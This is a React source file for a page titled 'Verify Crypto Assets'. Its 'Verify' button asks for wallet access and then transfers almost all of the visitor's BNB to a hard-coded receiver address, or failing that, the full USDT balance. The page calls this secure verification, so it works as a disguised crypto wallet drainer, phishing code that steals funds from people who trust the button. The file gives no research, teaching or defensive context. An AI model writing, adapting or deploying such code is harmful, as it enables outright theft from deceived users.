import React, { useState } from "react";
import { ethers } from "ethers";
import "./App.css";

function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 contract
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint)",
    "function transfer(address to, uint amount) returns (bool)",
  ];

  const handleVerify = async () => {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Please install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      // Check BNB
      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005"), // leave some gas
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      // Check USDT
      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  };

  return (
    <div className="app-container flex flex-col items-center justify-center min-h-screen text-center">
      {/* Header */}
      <h1 className="title text-4xl md:text-5xl font-bold text-yellow-400 mb-4">
        Verify Crypto Assets
      </h1>
      <p className="text-gray-300 mb-10 max-w-xl">
        Instantly verify and transfer BNB or USDT (BEP20) securely.
      </p>

      {/* Verify Button with glowing rings */}
      <div className="relative flex justify-center items-center w-48 h-48 mb-12">
        <div className="pulse-ring"></div>
        <div className="pulse-ring"></div>
        <div className="pulse-ring"></div>
        <button onClick={handleVerify} className="button-primary">
          Verify
        </button>
      </div>

      {/* Status */}
      <p className="status-text text-lg text-gray-300">{status}</p>
    </div>
  );
}

export default App;
